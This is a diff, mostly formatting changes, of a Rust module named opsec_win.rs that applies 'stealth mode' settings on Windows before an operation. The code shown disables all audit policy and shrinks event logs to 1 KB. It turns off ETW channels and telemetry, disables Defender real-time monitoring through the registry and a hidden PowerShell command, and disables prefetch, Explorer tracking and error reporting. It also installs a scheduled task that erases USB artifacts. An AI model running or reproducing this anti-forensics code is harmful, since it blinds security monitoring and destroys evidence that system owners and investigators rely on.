@@ -1,4 +1,3 @@
-#![cfg(target_os = "windows")]
 /*
  * opsec_win.rs — Pre-operation OPSEC hardening (nolog / stealth mode)
  *
@@ -26,9 +25,8 @@
 use std::io::Write;
 use std::process::Command;
 use windows_sys::Win32::System::Registry::{
-    RegCloseKey, RegCreateKeyExW, RegDeleteValueW, RegOpenKeyExW,
-    RegSetValueExW, HKEY, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE,
-    KEY_CREATE_SUB_KEY, KEY_SET_VALUE, KEY_WOW64_64KEY,
+    RegCloseKey, RegCreateKeyExW, RegDeleteValueW, RegOpenKeyExW, RegSetValueExW, HKEY,
+    HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, KEY_CREATE_SUB_KEY, KEY_SET_VALUE, KEY_WOW64_64KEY,
     REG_DWORD, REG_OPTION_NON_VOLATILE,
 };
 
@@ -43,29 +41,28 @@ fn wide(s: &str) -> Vec<u16> {
 /// RegCreateKeyExW creates all missing intermediate keys automatically.
 unsafe fn reg_create(root: HKEY, subkey: &str) -> Option<HKEY> {
     let path = wide(subkey);
-    let mut hkey: HKEY = 0;
+    let mut hkey: HKEY = std::ptr::null_mut();
     let mut disp: u32 = 0;
     let r = RegCreateKeyExW(
         root,
         path.as_ptr(),
         0,
-        std::ptr::null_mut(),                             // lpClass: unused
+        std::ptr::null_mut(), // lpClass: unused
         REG_OPTION_NON_VOLATILE,
         KEY_SET_VALUE | KEY_CREATE_SUB_KEY | KEY_WOW64_64KEY,
-        std::ptr::null(),                                  // default security
+        std::ptr::null(), // default security
         &mut hkey,
         &mut disp,
     );
-    if r != 0 { None } else { Some(hkey) }
+    if r != 0 {
+        None
+    } else {
+        Some(hkey)
+    }
 }
 
 /// Write a REG_DWORD value, creating the key path if absent.
-unsafe fn set_dword(
-    root: HKEY,
-    subkey: &str,
-    value: &str,
-    data: u32,
-) -> bool {
+unsafe fn set_dword(root: HKEY, subkey: &str, value: &str, data: u32) -> bool {
     let hkey = match reg_create(root, subkey) {
         Some(k) => k,
         None => return false,
@@ -80,10 +77,13 @@ unsafe fn set_dword(
 /// Delete a registry value. Returns true if deleted or already absent.
 unsafe fn del_reg_value(root: HKEY, subkey: &str, value: &str) -> bool {
     let path = wide(subkey);
-    let mut hkey: HKEY = 0;
+    let mut hkey: HKEY = std::ptr::null_mut();
     let r = RegOpenKeyExW(
-        root, path.as_ptr(), 0,
-        KEY_SET_VALUE | KEY_WOW64_64KEY, &mut hkey,
+        root,
+        path.as_ptr(),
+        0,
+        KEY_SET_VALUE | KEY_WOW64_64KEY,
+        &mut hkey,
     );
     if r != 0 {
         return true; // key absent — value already gone
@@ -99,7 +99,12 @@ unsafe fn del_reg_value(root: HKEY, subkey: &str, value: &str) -> bool {
 /// Disable all audit subcategory success + failure recording system-wide.
 fn disable_audit_policy(verbose: bool) -> bool {
     let ok = Command::new("auditpol")
-        .args(["/set", "/subcategory:*", "/success:disable", "/failure:disable"])
+        .args([
+            "/set",
+            "/subcategory:*",
+            "/success:disable",
+            "/failure:disable",
+        ])
         .status()
         .map(|s| s.success())
         .unwrap_or(false);
@@ -128,8 +133,12 @@ fn revert_audit_policy() {
     ];
     for sub in &subcats {
         let _ = Command::new("auditpol")
-            .args(["/set", &format!("/subcategory:{}", sub),
-                   "/success:enable", "/failure:enable"])
+            .args([
+                "/set",
+                &format!("/subcategory:{}", sub),
+                "/success:enable",
+                "/failure:enable",
+            ])
             .status();
     }
     eprintln!("[+] opsec_win: audit policy reverted to baseline subcategories");
@@ -146,20 +155,25 @@ fn shrink_eventlog_maxsize() -> u32 {
     let mut ok = 0u32;
     for log in CLASSIC_LOG_NAMES {
         let key = format!(r"SOFTWARE\Policies\Microsoft\Windows\EventLog\{}", log);
-        let done = unsafe {
-            set_dword(HKEY_LOCAL_MACHINE, &key, "MaxSize", 1)
-        };
-        if done { ok += 1; }
+        let done = unsafe { set_dword(HKEY_LOCAL_MACHINE, &key, "MaxSize", 1) };
+        if done {
+            ok += 1;
+        }
     }
-    eprintln!("[+] opsec_win: event log MaxSize=1 KB applied to {}/{} logs",
-        ok, CLASSIC_LOG_NAMES.len());
+    eprintln!(
+        "[+] opsec_win: event log MaxSize=1 KB applied to {}/{} logs",
+        ok,
+        CLASSIC_LOG_NAMES.len()
+    );
     ok
 }
 
 fn revert_eventlog_maxsize() {
     for log in CLASSIC_LOG_NAMES {
         let key = format!(r"SOFTWARE\Policies\Microsoft\Windows\EventLog\{}", log);
-        unsafe { del_reg_value(HKEY_LOCAL_MACHINE, &key, "MaxSize"); }
+        unsafe {
+            del_reg_value(HKEY_LOCAL_MACHINE, &key, "MaxSize");
+        }
     }
     eprintln!("[+] opsec_win: event log MaxSize policy removed");
 }
@@ -193,20 +207,30 @@ fn disable_verbose_etw_channels(verbose: bool) -> u32 {
     for ch in VERBOSE_ETW_CHANNELS {
         if set_etw_channel_state(ch, false) {
             ok += 1;
-            if verbose { eprintln!("[+] opsec_win: ETW disabled: {}", ch); }
+            if verbose {
+                eprintln!("[+] opsec_win: ETW disabled: {}", ch);
+            }
         } else {
             // Channel may not be present on all SKUs — not a hard failure
-            if verbose { eprintln!("[*] opsec_win: ETW skip (not present): {}", ch); }
+            if verbose {
+                eprintln!("[*] opsec_win: ETW skip (not present): {}", ch);
+            }
         }
     }
-    eprintln!("[+] opsec_win: ETW channels disabled: {}/{}", ok, VERBOSE_ETW_CHANNELS.len());
+    eprintln!(
+        "[+] opsec_win: ETW channels disabled: {}/{}",
+        ok,
+        VERBOSE_ETW_CHANNELS.len()
+    );
     ok
 }
 
 fn revert_verbose_etw_channels(verbose: bool) {
     for ch in VERBOSE_ETW_CHANNELS {
         set_etw_channel_state(ch, true);
-        if verbose { eprintln!("[+] opsec_win: ETW re-enabled: {}", ch); }
+        if verbose {
+            eprintln!("[+] opsec_win: ETW re-enabled: {}", ch);
+        }
     }
 }
 
@@ -255,7 +279,10 @@ fn block_telemetry_services() -> bool {
         if r {
             eprintln!("[+] opsec_win: telemetry service stopped+disabled: {}", svc);
         } else {
-            eprintln!("[!] opsec_win: service disable failed (may not exist): {}", svc);
+            eprintln!(
+                "[!] opsec_win: service disable failed (may not exist): {}",
+                svc
+            );
             // Not a hard failure — dmwappushservice is absent on some Win10 builds
         }
         ok &= r;
@@ -305,8 +332,10 @@ fn block_telemetry_hosts() -> bool {
     match std::fs::OpenOptions::new().append(true).open(HOSTS_PATH) {
         Ok(mut f) => match f.write_all(block.as_bytes()) {
             Ok(()) => {
-                eprintln!("[+] opsec_win: {} telemetry endpoints null-routed in hosts",
-                    TELEMETRY_HOSTS.len());
+                eprintln!(
+                    "[+] opsec_win: {} telemetry endpoints null-routed in hosts",
+                    TELEMETRY_HOSTS.len()
+                );
                 true
             }
             Err(e) => {
@@ -337,7 +366,9 @@ fn revert_telemetry_hosts() {
         .lines()
         .filter(|line| {
             // Remove our marker comment
-            if line.trim() == HOSTS_MARKER { return false; }
+            if line.trim() == HOSTS_MARKER {
+                return false;
+            }
             // Remove lines that contain any of our blocked hostnames
             !blocked_hosts.iter().any(|h| line.contains(h))
         })
@@ -386,7 +417,10 @@ fn disable_defender_policy() -> bool {
 fn disable_defender_ps() -> bool {
     let ok = Command::new("powershell")
         .args([
-            "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
+            "-NonInteractive",
+            "-WindowStyle",
+            "Hidden",
+            "-Command",
             "Set-MpPreference -DisableRealtimeMonitoring $true",
         ])
         .status()
@@ -416,7 +450,10 @@ fn revert_defender() {
     }
     let _ = Command::new("powershell")
         .args([
-            "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
+            "-NonInteractive",
+            "-WindowStyle",
+            "Hidden",
+            "-Command",
             "Set-MpPreference -DisableRealtimeMonitoring $false",
         ])
         .status();
@@ -425,16 +462,22 @@ fn revert_defender() {
 
 // ── 6. Pagefile — clear at shutdown ──────────────────────────────────────────
 
-const MEMMAN_KEY: &str =
-    r"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management";
+const MEMMAN_KEY: &str = r"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management";
 
 fn set_clear_pagefile_at_shutdown(enable: bool) -> bool {
     let ok = unsafe {
-        set_dword(HKEY_LOCAL_MACHINE, MEMMAN_KEY, "ClearPageFileAtShutdown", enable as u32)
+        set_dword(
+            HKEY_LOCAL_MACHINE,
+            MEMMAN_KEY,
+            "ClearPageFileAtShutdown",
+            enable as u32,
+        )
     };
     if ok {
-        eprintln!("[+] opsec_win: ClearPageFileAtShutdown = {} (takes effect at shutdown)",
-            enable as u32);
+        eprintln!(
+            "[+] opsec_win: ClearPageFileAtShutdown = {} (takes effect at shutdown)",
+            enable as u32
+        );
     } else {
         eprintln!("[!] opsec_win: ClearPageFileAtShutdown registry write failed");
     }
@@ -448,9 +491,7 @@ const PREFETCH_KEY: &str =
 
 /// Set EnablePrefetcher=0 (0=disabled, 1=app prefetch, 2=boot, 3=both).
 fn disable_prefetch_registry() -> bool {
-    let ok = unsafe {
-        set_dword(HKEY_LOCAL_MACHINE, PREFETCH_KEY, "EnablePrefetcher", 0)
-    };
+    let ok = unsafe { set_dword(HKEY_LOCAL_MACHINE, PREFETCH_KEY, "EnablePrefetcher", 0) };
     if ok {
         eprintln!("[+] opsec_win: EnablePrefetcher = 0");
     } else {
@@ -471,7 +512,9 @@ fn disable_sysmain() -> bool {
 
 fn revert_prefetch() {
     // Re-enable both application and boot prefetching (Windows default = 3)
-    unsafe { set_dword(HKEY_LOCAL_MACHINE, PREFETCH_KEY, "EnablePrefetcher", 3); }
+    unsafe {
+        set_dword(HKEY_LOCAL_MACHINE, PREFETCH_KEY, "EnablePrefetcher", 3);
+    }
     start_enable_service("SysMain", "auto");
     eprintln!("[+] opsec_win: prefetch re-enabled, SysMain started");
 }
@@ -512,7 +555,9 @@ fn set_explorer_notrack() -> bool {
     };
 
     if ok {
-        eprintln!("[+] opsec_win: Explorer no-track keys set (TrackProgs/TrackDocs/ThumbnailCache)");
+        eprintln!(
+            "[+] opsec_win: Explorer no-track keys set (TrackProgs/TrackDocs/ThumbnailCache)"
+        );
     } else {
         eprintln!("[!] opsec_win: one or more Explorer registry writes failed");
     }
@@ -575,36 +620,35 @@ fn revert_wer() {
 /// Minimal base64 encoder (no external dependencies).
 /// Output is standard base64 with '=' padding.
 fn base64_encode(data: &[u8]) -> String {
-    const CHARS: &[u8; 64] =
-        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    const CHARS: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
-    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
+    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
     let mut i = 0;
 
     while i + 2 < data.len() {
-        let a = data[i]     as usize;
+        let a = data[i] as usize;
         let b = data[i + 1] as usize;
         let c = data[i + 2] as usize;
-        out.push(CHARS[a >> 2]                     as char);
+        out.push(CHARS[a >> 2] as char);
         out.push(CHARS[((a & 3) << 4) | (b >> 4)] as char);
         out.push(CHARS[((b & 15) << 2) | (c >> 6)] as char);
-        out.push(CHARS[c & 63]                     as char);
+        out.push(CHARS[c & 63] as char);
         i += 3;
     }
     match data.len() - i {
         1 => {
             let a = data[i] as usize;
-            out.push(CHARS[a >> 2]          as char);
-            out.push(CHARS[(a & 3) << 4]   as char);
+            out.push(CHARS[a >> 2] as char);
+            out.push(CHARS[(a & 3) << 4] as char);
             out.push('=');
             out.push('=');
         }
         2 => {
-            let a = data[i]     as usize;
+            let a = data[i] as usize;
             let b = data[i + 1] as usize;
-            out.push(CHARS[a >> 2]                     as char);
+            out.push(CHARS[a >> 2] as char);
             out.push(CHARS[((a & 3) << 4) | (b >> 4)] as char);
-            out.push(CHARS[(b & 15) << 2]              as char);
+            out.push(CHARS[(b & 15) << 2] as char);
             out.push('=');
         }
         _ => {}
@@ -615,10 +659,7 @@ fn base64_encode(data: &[u8]) -> String {
 /// Encode a PowerShell script as a UTF-16LE base64 string suitable for -EncodedCommand.
 fn encode_ps_command(script: &str) -> String {
     let utf16: Vec<u16> = script.encode_utf16().collect();
-    let bytes: Vec<u8> = utf16
-        .iter()
-        .flat_map(|w| w.to_le_bytes())
-        .collect();
+    let bytes: Vec<u8> = utf16.iter().flat_map(|w| w.to_le_bytes()).collect();
     base64_encode(&bytes)
 }
 
@@ -751,9 +792,15 @@ fn install_usb_cleanup_task(verbose: bool) -> bool {
     let _ = std::fs::remove_file(xml_path);
 
     if ok {
-        eprintln!("[+] opsec_win: USB cleanup task installed: {}", USB_TASK_NAME);
+        eprintln!(
+            "[+] opsec_win: USB cleanup task installed: {}",
+            USB_TASK_NAME
+        );
     } else {
-        eprintln!("[!] opsec_win: schtasks /create failed for {}", USB_TASK_NAME);
+        eprintln!(
+            "[!] opsec_win: schtasks /create failed for {}",
+            USB_TASK_NAME
+        );
     }
     if verbose && ok {
         eprintln!("[*] opsec_win: USB task triggers: ConsoleDisconnect, RemoteDisconnect, PT1H");
@@ -777,25 +824,25 @@ fn remove_usb_cleanup_task() {
 #[derive(Debug, Default)]
 pub struct OpsecWinStats {
     /// Audit policy all-disable succeeded
-    pub audit_disabled:     bool,
+    pub audit_disabled: bool,
     /// Number of ETW operational channels successfully disabled
-    pub etw_channels_off:   u32,
+    pub etw_channels_off: u32,
     /// Telemetry services stopped, policy set, hosts updated
-    pub telemetry_blocked:  bool,
+    pub telemetry_blocked: bool,
     /// Defender real-time protection policy + PS fallback applied
-    pub defender_disabled:  bool,
+    pub defender_disabled: bool,
     /// ClearPageFileAtShutdown = 1 set in registry
     pub pagefile_clear_set: bool,
     /// Prefetch registry disabled + SysMain stopped
-    pub prefetch_disabled:  bool,
+    pub prefetch_disabled: bool,
     /// Explorer tracking keys set (TrackProgs/TrackDocs/ThumbnailCache)
-    pub explorer_notrack:   bool,
+    pub explorer_notrack: bool,
     /// WER policy disabled
-    pub wer_disabled:       bool,
+    pub wer_disabled: bool,
     /// USB cleanup scheduled task installed
     pub usb_task_installed: bool,
     /// Cumulative count of non-fatal failures
-    pub errors:             u32,
+    pub errors: u32,
 }
 
 /// Apply all OPSEC hardening measures.
@@ -809,12 +856,16 @@ pub fn apply_opsec_win(verbose: bool) -> OpsecWinStats {
     // 1. Audit policy
     eprintln!("[*] opsec_win: [1/9] disabling audit policy...");
     s.audit_disabled = disable_audit_policy(verbose);
-    if !s.audit_disabled { s.errors += 1; }
+    if !s.audit_disabled {
+        s.errors += 1;
+    }
 
     // 2. Event log size caps + 3. ETW channel disable
     eprintln!("[*] opsec_win: [2/9] shrinking event log channels...");
     let log_capped = shrink_eventlog_maxsize();
-    if log_capped < CLASSIC_LOG_NAMES.len() as u32 { s.errors += 1; }
+    if log_capped < CLASSIC_LOG_NAMES.len() as u32 {
+        s.errors += 1;
+    }
 
     eprintln!("[*] opsec_win: [3/9] disabling verbose ETW channels...");
     s.etw_channels_off = disable_verbose_etw_channels(verbose);
@@ -822,46 +873,60 @@ pub fn apply_opsec_win(verbose: bool) -> OpsecWinStats {
 
     // 4. Telemetry
     eprintln!("[*] opsec_win: [4/9] blocking telemetry...");
-    let svc_ok  = block_telemetry_services();
-    let pol_ok  = set_telemetry_policy_zero();
+    let svc_ok = block_telemetry_services();
+    let pol_ok = set_telemetry_policy_zero();
     let host_ok = block_telemetry_hosts();
     s.telemetry_blocked = svc_ok && pol_ok && host_ok;
-    if !s.telemetry_blocked { s.errors += 1; }
+    if !s.telemetry_blocked {
+        s.errors += 1;
+    }
 
     // 5. Defender
     eprintln!("[*] opsec_win: [5/9] disabling Defender real-time protection...");
     let def_reg = disable_defender_policy();
-    let def_ps  = disable_defender_ps();
+    let def_ps = disable_defender_ps();
     s.defender_disabled = def_reg || def_ps; // either method suffices
-    if !s.defender_disabled { s.errors += 1; }
+    if !s.defender_disabled {
+        s.errors += 1;
+    }
 
     // 6. Pagefile
     eprintln!("[*] opsec_win: [6/9] setting ClearPageFileAtShutdown...");
     s.pagefile_clear_set = set_clear_pagefile_at_shutdown(true);
-    if !s.pagefile_clear_set { s.errors += 1; }
+    if !s.pagefile_clear_set {
+        s.errors += 1;
+    }
 
     // 7. Prefetch
     eprintln!("[*] opsec_win: [7/9] disabling prefetch / SysMain...");
     let pf_reg = disable_prefetch_registry();
     let pf_svc = disable_sysmain();
     s.prefetch_disabled = pf_reg && pf_svc;
-    if !s.prefetch_disabled { s.errors += 1; }
+    if !s.prefetch_disabled {
+        s.errors += 1;
+    }
 
     // 8. Explorer no-track
     eprintln!("[*] opsec_win: [8/9] configuring Explorer no-track...");
     s.explorer_notrack = set_explorer_notrack();
-    if !s.explorer_notrack { s.errors += 1; }
+    if !s.explorer_notrack {
+        s.errors += 1;
+    }
 
     // 9. WER disable
     // (also sets WER for the session before USB task since task XML write could trigger WER)
     let wer = disable_wer();
     s.wer_disabled = wer;
-    if !s.wer_disabled { s.errors += 1; }
+    if !s.wer_disabled {
+        s.errors += 1;
+    }
 
     // 10. USB cleanup task
     eprintln!("[*] opsec_win: [9/9] installing USB artifact cleanup task...");
     s.usb_task_installed = install_usb_cleanup_task(verbose);
-    if !s.usb_task_installed { s.errors += 1; }
+    if !s.usb_task_installed {
+        s.errors += 1;
+    }
 
     eprintln!("[+] opsec_win: apply complete — {} error(s)", s.errors);
     if verbose {
